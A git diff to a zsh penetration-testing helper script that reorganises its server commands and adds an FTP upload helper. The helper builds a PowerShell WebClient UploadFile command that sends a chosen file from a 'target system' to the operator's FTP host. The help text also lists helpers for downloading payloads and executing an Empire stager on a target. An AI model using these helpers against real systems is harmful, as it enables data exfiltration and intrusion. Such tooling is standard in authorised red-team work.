@@ -20,20 +20,20 @@ nb-srv-ngrok            hosts a ngrok web server in server dir
 
 Commands to download a file from server
 -------------------------------------
+nb-srv-smb              hosts an impacket smb server in current dir
+nb-srv-smb-auth         hosts an impacket smb server with authentication in current dir
 nb-srv-ftp              hosts a python ftp server in current dir
 
 Commands to upload a file to a server
 -------------------------------------
 nb-srv-uploadserver     hosts a python 'uploadserver' in current dir
-nb-srv-smb              hosts an impacket smb server in current dir
-nb-srv-smb-auth         hosts an impacket smb server with authentication in current dir
 nb-srv-smb-http         hosts an SMB over HTTP with WebDav
 
 General Commands
 -------------------------------------
-nb-srv-install          install dependencies
 nb-srv-file-download    select one of general commands to download a payload into a target machine
 nb-srv-empire-stager    command to download and execute empire stager in a target machine
+nb-srv-install          install dependencies
 
 
 nb-srv-nc-tar           hosts a netcat server > tar file in current dir
@@ -156,7 +156,7 @@ nb-srv-uploadserver() {
 	print -z "sudo python3 -m uploadserver"
 }
 
-nb-srv-ftp() {
+nb-srv-ftp-down() {
   nb-vars-set-lhost
   local filename && __askvar filename "FILENAME"
 
@@ -165,7 +165,20 @@ nb-srv-ftp() {
   echo "$__COMMAND" | wl-copy
   __info "Command to use on a target system copied to clipboard"
 
-	print -z "sudo python -m pyftpdlib -p 21 -w"
+	print -z "sudo python -m pyftpdlib --port 21"
+}
+
+nb-srv-ftp-up() {
+  nb-vars-set-lhost
+  local filename && __askvar filename "FILENAME"
+  local path && __askvar path "FULL_PATH_TO_FILE"
+
+  echo
+  __COMMAND=(New-Object Net.WebClient).UploadFile('ftp://${__LHOST}/$filename', '$path')
+  echo "$__COMMAND" | wl-copy
+  __info "Command to use on a target system copied to clipboard"
+
+  print -z "sudo python -m pyftpdlib --port 21 --write"
 }
 
 nb-srv-smb() {
